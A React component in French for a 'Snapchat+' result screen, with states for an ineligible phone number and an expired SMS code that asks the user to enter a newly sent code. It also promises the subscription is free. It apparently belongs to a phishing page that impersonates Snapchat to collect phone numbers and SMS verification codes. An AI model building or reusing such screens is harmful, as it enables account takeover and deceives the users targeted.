import { motion } from "framer-motion";
import { XCircle, Clock } from "lucide-react";

export default function ResultScreen({ type, onBack }) {
  const config = {
    wrong: {
      icon: <XCircle className="w-10 h-10 text-red-400" />,
      iconBg: "bg-red-900/40 border-red-500/30",
      title: "Numéro non éligible",
      titleColor: "text-red-400",
      message: "Ce numéro de téléphone n'est pas éligible à l'offre Snapchat+. Veuillez vérifier votre numéro et réessayer.",
      btnLabel: "Réessayer avec un autre numéro"
    },
    expired: {
      icon: <Clock className="w-10 h-10 text-orange-400" />,
      iconBg: "bg-orange-900/40 border-orange-500/30",
      title: "Code expiré",
      titleColor: "text-orange-400",
      message: "Votre code SMS a expiré. Un nouveau code va vous être envoyé, veuillez entrer le nouveau code ci-dessous.",
      btnLabel: "Entrer le nouveau code"
    }
  };

  const c = config[type] || config.wrong;

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: "easeOut" }}
      className="w-full max-w-sm mx-auto">
      
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        {/* Logo */}
        <div className="flex flex-col items-center mb-6">
          <div className="w-16 h-16 bg-primary rounded-2xl flex items-center justify-center mb-4 shadow-lg shadow-primary/30">
            <span className="text-3xl hidden">👻</span>
          </div>
          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
            Snapchat<span className="text-primary">+</span>
          </h1>
        </div>

        {/* Icon */}
        <div className={`w-20 h-20 ${c.iconBg} border rounded-2xl flex items-center justify-center mx-auto mb-6`}>
          {c.icon}
        </div>

        <h2 className={`font-heading text-2xl font-black ${c.titleColor} mb-3`}>
          {c.title}
        </h2>

        <p className="text-muted-foreground text-sm mb-8 leading-relaxed px-2">
          {c.message}
        </p>

        <motion.button
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          onClick={onBack}
          className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide shadow-lg shadow-primary/30">
          
          {c.btnLabel}
        </motion.button>

        <p className="text-muted-foreground/40 text-xs mt-6 leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>);

}